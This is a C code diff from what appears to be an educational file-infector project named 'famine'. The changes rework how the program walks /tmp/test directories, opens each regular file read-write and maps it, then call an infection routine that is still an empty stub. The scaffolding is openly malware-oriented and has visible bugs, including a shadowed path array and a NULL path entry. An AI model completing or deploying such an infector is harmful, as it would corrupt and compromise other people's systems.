@@ -25,20 +25,20 @@ int init_data(data_t* data, const char *filename) {
 	data->_file_size     = 0U;
 	data->_oentry_off    = 0U;
 
-	data->_fd = _syscall(SYS_OPEN, (long)filename, O_RDONLY);
+	data->_fd = _syscall(SYS_OPEN, filename, O_RDWR);
 
 	if (data->_fd == -1) {
 		ERR_SYS("open");
 		return -1;
 	}
-
 	{
+
 		char ehdr[5U];
-		ehdr[4] = 0;
+
+		ft_memset(ehdr, 0, sizeof(ehdr));
 
 		if (_syscall(SYS_READ, data->_fd, (long)ehdr, 5U) == -1) {
 			ERR_SYS("read");
-			_syscall(SYS_WRITE, 1, (long)"read\n", 5);
 			return -1;
 		}
 
@@ -52,17 +52,21 @@ int init_data(data_t* data, const char *filename) {
 		}
 	}
 
-
-	const ssize_t file_size = _syscall(SYS_LSEEK, data->_fd, 0, SEEK_END);
-
-	if (file_size == -1) {
-		ERR_SYS("lseek");
+	struct stat st;
+	if (_syscall(SYS_FSTAT, data->_fd, (long)&st) == -1) {
+		ERR_SYS("fstat");
 		return -1;
 	}
 
+	ssize_t file_size = st.st_size;
+
+
+
 	data->_file_size = (size_t)file_size;
 
-	void *file_map = (long *)_syscall(SYS_MMAP, 0, data->_file_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, data->_fd, 0);
+	//void *file_map = (void *)_syscall(SYS_MMAP, NULL, data->_file_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, data->_fd, 4096);
+	off_t align_offset = 0;
+	void *file_map = (void *)_syscall(SYS_mmap, 0, data->_file_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, data->_fd, align_offset);
 
 	if (file_map == MAP_FAILED) {
 		ERR_SYS("mmap");
@@ -74,6 +78,11 @@ int init_data(data_t* data, const char *filename) {
 	return 0;
 }
 
+void	start_infection(data_t *data) {
+
+}
+
+
 static void	infect(const char *filename)
 {
 	data_t data;
@@ -81,6 +90,11 @@ static void	infect(const char *filename)
 	int ret = 0;
 
 	ret = init_data(&data, filename);
+	if (!ret)
+	{
+		PRINT("File: %s", filename);
+		start_infection(&data);
+	}
 	destroy_data(&data);
 	
 }
@@ -128,23 +142,25 @@ static void	open_files(const char *path)
 	if (fd == -1) _syscall(SYS_EXIT, 1);
 
 	char buf[1024];
-	unsigned long ret = 0;
+	ssize_t ret = 0;
 
 	// getents64
-	while ((ret = _syscall(SYS_GETDENTS64, fd, buf, 1024)) > 0)
+	for (;;)
 	{
-		for (unsigned long i = 0; i < ret;)
+		ret = _syscall(SYS_GETDENTS64, fd, (long)buf, 1024);
+		if (ret == -1) return ;
+		if (ret == 0) break;
+		for (size_t i = 0; i < (size_t)ret;)
 		{
 			struct linux_dirent *dir = (struct linux_dirent *)(buf + i);
 			if (dir->d_type == DT_REG)
 			{
 				char *file = dir->d_name;
-				PRINT("file: %s\n", file);
+				PRINT("file: %s", file);
 				char new_path[1024];
 				make_path(new_path, path, file);
 
 				infect(new_path);
-				_syscall(SYS_EXIT, 0);
 			}
 			else if (dir->d_type == DT_DIR)
 			{
@@ -159,27 +175,35 @@ static void	open_files(const char *path)
 			i += dir->d_reclen;
 		}
 	}
+	_syscall(SYS_CLOSE, fd);
 }
 
 void	famine(void)
 {
-	static const char *v_path[2] = {"/tmp/test", "/tmp/test2"};
+	
+	char	*v_path[] = {
+		((char []){'/','t','m','p','/','t','e','s','t','\0'}),
+		((char []){'/','t','m','p','/','t','e','s','t','2','\0'}),
+		NULL
+	};
+
 	unsigned long v_size = sizeof(v_path) / sizeof(v_path[0]);
 	for (unsigned long i = 0; i < v_size; i++)
 	{
+	char *v_path[] = {"/tmp/test", "/tmp/test2", NULL};
 		open_files(v_path[i]);
 	}
 	return ;
 }
 
-//void	_start(void)
-//{
-//	famine();
-//	_syscall(SYS_EXIT, 0);
-//}
-//
-int main(void)
+void	_start(void)
 {
 	famine();
-	return 0;
+	_syscall(SYS_EXIT, 0);
 }
+
+//int main(void)
+//{
+//	famine();
+//	return 0;
+//}
